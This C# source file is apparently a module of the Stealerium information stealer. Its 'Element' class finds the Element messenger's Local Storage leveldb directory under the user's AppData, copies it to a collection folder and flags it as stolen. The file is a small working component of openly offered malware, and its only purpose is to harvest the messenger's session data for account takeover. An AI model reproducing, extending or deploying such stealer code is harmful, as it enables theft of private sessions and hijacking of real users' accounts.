using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers
{
    internal sealed class Element
    {
        private static readonly string ElementPath = Path.Combine(Paths.Appdata, "Element\\Local Storage");

        // Copy session directory
        public static void GetSession(string sSavePath)
        {
            if (!Directory.Exists(ElementPath))
                return;

            var localStorage = Path.Combine(ElementPath, "leveldb");
            if (Directory.Exists(localStorage))
                try
                {
                    Filemanager.CopyDirectory(localStorage, sSavePath + "\\leveldb");
                }
                catch
                {
                    return;
                }

            Counter.Element = true;
        }
    }
}